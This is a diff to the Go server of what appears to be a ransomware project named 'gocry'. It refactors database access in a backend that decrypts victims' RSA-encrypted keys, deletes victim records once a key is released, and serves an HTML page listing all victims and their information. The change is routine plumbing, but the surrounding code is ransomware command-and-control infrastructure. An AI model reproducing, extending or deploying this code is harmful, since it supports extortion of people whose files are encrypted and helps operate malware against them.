@@ -16,12 +16,10 @@ import (
 	"time"
 
 	"github.com/joho/godotenv"
+	"github.com/nireo/gocry/server/database"
 	"github.com/nireo/gocry/server/gen_rsa"
-	"gorm.io/driver/postgres"
 	"gorm.io/gorm"
 )
-
-var db *gorm.DB
 
 // DecryptKey takes a RSA encrypted key and then decrypts that key using the private key stored in
 // the server.
@@ -71,6 +69,8 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	db := database.GetDatabase()
+
 	// since creating the decrypted key was successful we can delete the victim from the database
 	var victim Victim
 	if err := db.Where(&Victim{UUID: id[0]}).First(&victim).Error; err != nil {
@@ -99,6 +99,8 @@ type victimHtmlDisplay struct {
 // ServeVictimsDisplay returns a simple html page with all the victims and they information.
 func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/html")
+
+	db := database.GetDatabase()
 
 	var victims []Victim
 	db.Find(&victims)
@@ -204,25 +206,8 @@ func main() {
 		log.Fatalf("could not load environment variables: %s", err)
 	}
 
-	dbHost := os.Getenv("db_host")
-	dbPort := os.Getenv("db_port")
-	dbUser := os.Getenv("db_user")
-	dbName := os.Getenv("db_name")
-
-	// Connect to the database
-	var err error
-	db, err = gorm.Open(postgres.New(postgres.Config{
-		DSN: fmt.Sprintf("host=%s port=%s user=%s dbname=%s sslmode=disable",
-			dbHost, dbPort, dbUser, dbName),
-	}), &gorm.Config{})
-
-	if err != nil {
-		log.Fatalf("could not establish a database connection: %s", err)
-	}
-
-	// always migrate the victim model
-	db.AutoMigrate(&Victim{})
-
+	database.ConnectToDatbase()
+	db := database.GetDatabase()
 	// This is mostly just for debugging purposes
 	if len(os.Args) == 2 && os.Args[1] == "remove_data" {
 
